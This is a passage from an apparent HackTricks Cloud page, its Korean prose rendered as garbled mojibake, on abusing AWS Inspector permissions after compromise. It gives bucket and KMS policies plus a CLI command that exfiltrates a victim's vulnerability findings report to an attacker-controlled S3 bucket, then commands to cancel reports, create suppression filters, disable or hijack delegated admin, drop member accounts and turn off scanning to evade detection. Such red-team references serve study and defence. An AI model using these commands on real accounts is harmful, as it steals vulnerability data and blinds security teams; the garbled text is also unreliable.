1. **Amazon S3 ë²„í‚· ìƒì„±** ë° í”¼í•´ì Amazon Inspectorì—ì„œ ì ‘ê·¼í•  ìˆ˜ ìˆë„ë¡ ì •ì±…ì„ ì—°ê²°í•©ë‹ˆë‹¤:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "allow-inspector",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"s3:PutObject",
"s3:PutObjectAcl",
"s3:AbortMultipartUpload"
],
"Resource": "arn:aws:s3:::inspector-findings/*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
},
"ArnLike": {
"aws:SourceArn": "arn:aws:inspector2:us-east-1:<victim-account-id>:report/*"
}
}
}
]
}
```
2. **Amazon KMS í‚¤ë¥¼ ìƒì„±**í•˜ê³  í”¼í•´ìì˜ Amazon Inspectorì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆë„ë¡ ì •ì±…ì„ ì—°ê²°í•©ë‹ˆë‹¤:
```json
{
"Version": "2012-10-17",
"Id": "key-policy",
"Statement": [
{
...
},
{
"Sid": "Allow victim Amazon Inspector to use the key",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
}
}
}
]
}
```
3. **ë°œê²¬ ë³´ê³ ì„œ**ë¥¼ ìƒì„±í•˜ëŠ” ëª…ë ¹ì„ ì‹¤í–‰í•˜ì—¬ ì´ë¥¼ ìœ ì¶œí•©ë‹ˆë‹¤:
```bash
aws --region us-east-1 inspector2 create-findings-report --report-format CSV --s3-destination bucketName=<attacker-bucket-name>,keyPrefix=exfiltration_,kmsKeyArn=arn:aws:kms:us-east-1:123456789012:key/1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f
```
* **ì ì¬ì  ì˜í–¥**: ìƒì„¸í•œ ì·¨ì•½ì  ë° ì†Œí”„íŠ¸ì›¨ì–´ ë³´ê³ ì„œì˜ ìƒì„± ë° ìœ ì¶œ, íŠ¹ì • ì·¨ì•½ì  ë° ë³´ì•ˆ ì•½ì ì— ëŒ€í•œ í†µì°°ë ¥ íšë“.

#### `inspector2:CancelFindingsReport`, `inspector2:CancelSbomExport`

ê³µê²©ìëŠ” ì§€ì •ëœ ë°œê²¬ ë³´ê³ ì„œ ë˜ëŠ” SBOM ë³´ê³ ì„œì˜ ìƒì„±ì„ ì·¨ì†Œí•˜ì—¬ ë³´ì•ˆ íŒ€ì´ ì·¨ì•½ì  ë° ì†Œí”„íŠ¸ì›¨ì–´ ìì¬ ëª…ì„¸ì„œ(SBOM)ì— ëŒ€í•œ ì ì‹œ ì •ë³´ë¥¼ ë°›ì§€ ëª»í•˜ê²Œ í•˜ì—¬ ë³´ì•ˆ ë¬¸ì œì˜ íƒì§€ ë° ìˆ˜ì •ì´ ì§€ì—°ë˜ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# Cancel findings report generation
aws inspector2 cancel-findings-report --report-id <value>
# Cancel SBOM report generatiom
aws inspector2 cancel-sbom-export --report-id <value>
```
* **ì ì¬ì  ì˜í–¥**: ë³´ì•ˆ ëª¨ë‹ˆí„°ë§ì˜ ì¤‘ë‹¨ ë° ë³´ì•ˆ ë¬¸ì œì˜ ì ì‹œ íƒì§€ ë° ìˆ˜ì • ë°©ì§€.

#### `inspector2:CreateFilter`, `inspector2:UpdateFilter`, `inspector2:DeleteFilter`

ì´ ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” ì–´ë–¤ ì·¨ì•½ì ê³¼ ë³´ì•ˆ ë¬¸ì œê°€ ë³´ê³ ë˜ê±°ë‚˜ ì–µì œë˜ëŠ”ì§€ë¥¼ ê²°ì •í•˜ëŠ” í•„í„°ë§ ê·œì¹™ì„ ì¡°ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤( **action**ì´ SUPPRESSë¡œ ì„¤ì •ë˜ë©´ ì–µì œ ê·œì¹™ì´ ìƒì„±ë©ë‹ˆë‹¤). ì´ëŠ” ë³´ì•ˆ ê´€ë¦¬ìì—ê²Œ ì¤‘ìš”í•œ ì·¨ì•½ì ì„ ìˆ¨ê²¨, íƒì§€ ì—†ì´ ì´ëŸ¬í•œ ì•½ì ì„ ì•…ìš©í•˜ê¸° ì‰½ê²Œ ë§Œë“­ë‹ˆë‹¤. ì¤‘ìš”í•œ í•„í„°ë¥¼ ë³€ê²½í•˜ê±°ë‚˜ ì œê±°í•¨ìœ¼ë¡œì¨, ê³µê²©ìëŠ” ì‹œìŠ¤í…œì„ ê´€ë ¨ ì—†ëŠ” ê²°ê³¼ë¡œ ë„˜ì³ë‚˜ê²Œ í•˜ì—¬ íš¨ê³¼ì ì¸ ë³´ì•ˆ ëª¨ë‹ˆí„°ë§ ë° ëŒ€ì‘ì„ ë°©í•´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# Create
aws inspector2 create-filter --action <NONE | SUPPRESS> --filter-criteria <value> --name <value> [--reason <value>]
# Update
aws inspector2 update-filter --filter-arn <value> [--action <NONE | SUPPRESS>] [--filter-criteria <value>] [--reason <value>]
# Delete
aws inspector2 delete-filter --arn <value>
```
* **ì ì¬ì  ì˜í–¥**: ì¤‘ìš”í•œ ì·¨ì•½ì ì„ ìˆ¨ê¸°ê±°ë‚˜ ì–µì œí•˜ê±°ë‚˜, ì‹œìŠ¤í…œì„ ë¬´ê´€í•œ ê²°ê³¼ë¡œ ë²”ëŒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### `inspector2:DisableDelegatedAdminAccount`, (`inspector2:EnableDelegatedAdminAccount` & `organizations:ListDelegatedAdministrators` & `organizations:EnableAWSServiceAccess` & `iam:CreateServiceLinkedRole`)

ê³µê²©ìëŠ” ë³´ì•ˆ ê´€ë¦¬ êµ¬ì¡°ë¥¼ ì‹¬ê°í•˜ê²Œ ë°©í•´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* ìœ„ì„ëœ ê´€ë¦¬ì ê³„ì •ì„ ë¹„í™œì„±í™”í•˜ë©´, ê³µê²©ìëŠ” ë³´ì•ˆ íŒ€ì´ Amazon Inspector ì„¤ì • ë° ë³´ê³ ì„œì— ì ‘ê·¼í•˜ê³  ê´€ë¦¬í•˜ëŠ” ê²ƒì„ ë°©ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ë¬´ë‹¨ ê´€ë¦¬ì ê³„ì •ì„ í™œì„±í™”í•˜ë©´ ê³µê²©ìê°€ ë³´ì•ˆ êµ¬ì„±ì„ ì œì–´í•  ìˆ˜ ìˆìœ¼ë©°, ìŠ¤ìº”ì„ ë¹„í™œì„±í™”í•˜ê±°ë‚˜ ì„¤ì •ì„ ìˆ˜ì •í•˜ì—¬ ì•…ì˜ì ì¸ í™œë™ì„ ìˆ¨ê¸¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="warning" %}
ë¬´ë‹¨ ê³„ì •ì´ ìœ„ì„ëœ ê´€ë¦¬ìê°€ ë˜ê¸° ìœ„í•´ì„œëŠ” í”¼í•´ìì™€ ë™ì¼í•œ ì¡°ì§ì— ìˆì–´ì•¼ í•©ë‹ˆë‹¤.

ë¬´ë‹¨ ê³„ì •ì´ ìœ„ì„ëœ ê´€ë¦¬ìê°€ ë˜ê¸° ìœ„í•´ì„œëŠ”, í•©ë²•ì ì¸ ìœ„ì„ëœ ê´€ë¦¬ìê°€ ë¹„í™œì„±í™”ëœ í›„, ë¬´ë‹¨ ê³„ì •ì´ ìœ„ì„ëœ ê´€ë¦¬ìë¡œ í™œì„±í™”ë˜ê¸° ì „ì— í•©ë²•ì ì¸ ê´€ë¦¬ìê°€ ì¡°ì§ì—ì„œ ìœ„ì„ëœ ê´€ë¦¬ìì—ì„œ ë“±ë¡ í•´ì œë˜ì–´ì•¼ í•©ë‹ˆë‹¤. ì´ëŠ” ë‹¤ìŒ ëª…ë ¹ì–´ë¡œ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (**`organizations:DeregisterDelegatedAdministrator`** ê¶Œí•œ í•„ìš”): **`aws organizations deregister-delegated-administrator --account-id <legit-account-id> --service-principal [inspector2.amazonaws.com](http://inspector2.amazonaws.com/)`**
{% endhint %}
```bash
# Disable
aws inspector2 disable-delegated-admin-account --delegated-admin-account-id <value>
# Enable
aws inspector2 enable-delegated-admin-account --delegated-admin-account-id <value>
```
* **ì ì¬ì  ì˜í–¥**: ë³´ì•ˆ ê´€ë¦¬ì˜ ì¤‘ë‹¨.

#### `inspector2:AssociateMember`, `inspector2:DisassociateMember`

ê³µê²©ìëŠ” Amazon Inspector ì¡°ì§ ë‚´ì—ì„œ íšŒì› ê³„ì •ì˜ ì—°ê´€ì„±ì„ ì¡°ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë¬´ë‹¨ ê³„ì •ì„ ì—°ê´€ì‹œí‚¤ê±°ë‚˜ ì •ë‹¹í•œ ê³„ì •ì„ ë¶„ë¦¬í•¨ìœ¼ë¡œì¨, ê³µê²©ìëŠ” ë³´ì•ˆ ìŠ¤ìº” ë° ë³´ê³ ì„œì— í¬í•¨ë˜ëŠ” ê³„ì •ì„ ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¡œ ì¸í•´ ì¤‘ìš”í•œ ê³„ì •ì´ ë³´ì•ˆ ëª¨ë‹ˆí„°ë§ì—ì„œ ì œì™¸ë  ìˆ˜ ìˆìœ¼ë©°, ê³µê²©ìëŠ” ì´ëŸ¬í•œ ê³„ì •ì˜ ì·¨ì•½ì ì„ íƒì§€ë˜ì§€ ì•Šê³  ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="warning" %}
ì´ ì‘ì—…ì€ ìœ„ì„ëœ ê´€ë¦¬ìê°€ ìˆ˜í–‰í•´ì•¼ í•©ë‹ˆë‹¤.
{% endhint %}
```bash
# Associate
aws inspector2 associate-member --account-id <value>
# Disassociate
aws inspector2 disassociate-member --account-id <value>
```
* **ì ì¬ì  ì˜í–¥**: ë³´ì•ˆ ìŠ¤ìº”ì—ì„œ ì£¼ìš” ê³„ì • ì œì™¸, ì·¨ì•½ì ì˜ íƒì§€ë˜ì§€ ì•Šì€ ì•…ìš© ê°€ëŠ¥ì„±.

#### `inspector2:Disable`, (`inspector2:Enable` & `iam:CreateServiceLinkedRole`)

`inspector2:Disable` ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” íŠ¹ì • ë¦¬ì†ŒìŠ¤ ìœ í˜•(EC2, ECR, Lambda, Lambda ì½”ë“œ)ì— ëŒ€í•œ ë³´ì•ˆ ìŠ¤ìº”ì„ ë¹„í™œì„±í™”í•  ìˆ˜ ìˆìœ¼ë©°, ì§€ì •ëœ ê³„ì •ì—ì„œ AWS í™˜ê²½ì˜ ì¼ë¶€ê°€ ëª¨ë‹ˆí„°ë§ë˜ì§€ ì•Šê³  ê³µê²©ì— ì·¨ì•½í•˜ê²Œ ë‚¨ê²Œ ë©ë‹ˆë‹¤. ë˜í•œ, **`inspector2:Enable`** ë° **`iam:CreateServiceLinkedRole`** ê¶Œí•œ ë•ë¶„ì— ê³µê²©ìëŠ” ì˜ì‹¬ìŠ¤ëŸ¬ìš´ êµ¬ì„±ì„ íƒì§€ë˜ì§€ ì•Šë„ë¡ ì„ íƒì ìœ¼ë¡œ ìŠ¤ìº”ì„ ë‹¤ì‹œ í™œì„±í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="warning" %}
ì´ ì‘ì—…ì€ ìœ„ì„ëœ ê´€ë¦¬ìê°€ ìˆ˜í–‰í•´ì•¼ í•©ë‹ˆë‹¤.
{% endhint %}
```bash
# Disable
aws inspector2 disable --account-ids <value> [--resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}>]
# Enable
aws inspector2 enable --resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}> [--account-ids <value>]
```
* **ì ì¬ì  ì˜í–¥**: ë³´ì•ˆ ëª¨ë‹ˆí„°ë§ì—ì„œ ë¸”ë¼ì¸ë“œ ìŠ¤íŒŸ ìƒì„±.

#### `inspector2:UpdateOrganizationConfiguration`

ì´ ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” Amazon Inspector ì¡°ì§ì˜ êµ¬ì„±ì„ ì—…ë°ì´íŠ¸í•  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ìƒˆë¡œìš´ íšŒì› ê³„ì •ì— ëŒ€í•´ í™œì„±í™”ëœ ê¸°ë³¸ ìŠ¤ìº” ê¸°ëŠ¥ì— ì˜í–¥ì„ ë¯¸ì¹©ë‹ˆë‹¤.

{% hint style="warning" %}
ì´ ì‘ì—…ì€ ìœ„ì„ëœ ê´€ë¦¬ìê°€ ìˆ˜í–‰í•´ì•¼ í•©ë‹ˆë‹¤.
{% endhint %}
```bash
aws inspector2 update-organization-configuration --auto-enable <ec2=true|false,ecr=true|false,lambda=true|false,lambdaCode=true|false>
```
* **ì ì¬ì  ì˜í–¥**: ì¡°ì§ì˜ ë³´ì•ˆ ìŠ¤ìº” ì •ì±… ë° êµ¬ì„±ì„ ë³€ê²½í•©ë‹ˆë‹¤.

#### `inspector2:TagResource`, `inspector2:UntagResource`

ê³µê²©ìëŠ” AWS Inspector ë¦¬ì†ŒìŠ¤ì˜ íƒœê·¸ë¥¼ ì¡°ì‘í•  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ë³´ì•ˆ í‰ê°€ë¥¼ ì¡°ì§í•˜ê³  ì¶”ì í•˜ë©° ìë™í™”í•˜ëŠ” ë° ì¤‘ìš”í•©ë‹ˆë‹¤. íƒœê·¸ë¥¼ ë³€ê²½í•˜ê±°ë‚˜ ì œê±°í•¨ìœ¼ë¡œì¨ ê³µê²©ìëŠ” ë³´ì•ˆ ìŠ¤ìº”ì—ì„œ ì·¨ì•½ì ì„ ìˆ¨ê¸°ê³ , ì¤€ìˆ˜ ë³´ê³ ë¥¼ ë°©í•´í•˜ë©°, ìë™í™”ëœ ìˆ˜ì • í”„ë¡œì„¸ìŠ¤ì— ê°„ì„­í•˜ì—¬ ì ê²€ë˜ì§€ ì•Šì€ ë³´ì•ˆ ë¬¸ì œì™€ ì‹œìŠ¤í…œ ë¬´ê²°ì„± ì†ìƒì„ ì´ˆë˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
aws inspector2 tag-resource --resource-arn <value> --tags <value>
aws inspector2 untag-resource --resource-arn <value> --tag-keys <value>
```
* **Potential Impact**: ì·¨ì•½ì  ìˆ¨ê¸°ê¸°, ì»´í”Œë¼ì´ì–¸ìŠ¤ ë³´ê³ ì„œ ì¤‘ë‹¨, ë³´ì•ˆ ìë™í™” ì¤‘ë‹¨ ë° ë¹„ìš© í• ë‹¹ ì¤‘ë‹¨.

## References

* [https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html](https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html)
* [https://docs.aws.amazon.com/service-authorization/latest/reference/list\_amazoninspector2.html](https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
